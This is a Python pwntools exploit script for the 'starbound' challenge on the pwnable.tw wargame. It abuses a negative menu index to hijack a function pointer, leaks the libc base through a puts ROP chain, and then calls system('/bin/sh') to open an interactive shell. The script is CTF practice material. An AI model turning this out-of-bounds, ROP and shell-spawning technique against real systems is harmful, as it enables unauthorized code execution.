# encoding:utf-8
from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
file = './starbound'
e = ELF(file)
libc = e.libc
rlibc = ''
ip = 'chall.pwnable.tw'
port = '10202'
debug = False


def dbg(code=""):
    global debug
    if debug == False:
        return
    gdb.attach(p, code)


def run(local):
    global p, libc, debug
    if local == 1:
        debug = True
        p = process(file)
    else:
        p = remote(ip, port)
        debug = False
        if rlibc != '':
            libc = ELF(rlibc)


se = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sea = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
rc = lambda: p.recv(timeout=0.5)
ru = lambda x: p.recvuntil(x, drop=True)
rn = lambda x: p.recv(x)
shell = lambda: p.interactive()
un64 = lambda x: u64(x.ljust(8, '\x00'))
un32 = lambda x: u32(x.ljust(4, '\x00'))

run(0)
sla("> ", "6")
sla("> ", "2")
sla("name:", p32(0x08048e48))
rop_chain = p32(e.plt['puts']) + p32(0x0804A605) + p32(e.got['puts'])
sla("> ", "-33".ljust(0x8, '\x00') + rop_chain)
libc.address = un32(rn(4)) - libc.symbols['puts']
print hex(libc.address)
sla("> ", "6")
sla("> ", "2")
sla("name:", p32(0x08048e48) + '/bin/sh')
rop_chain = p32(libc.symbols['system']) + p32(0) + p32(0x080580D4) * 2
sla("> ", "-33".ljust(0x8, '\x00') + rop_chain)
rc()
shell()
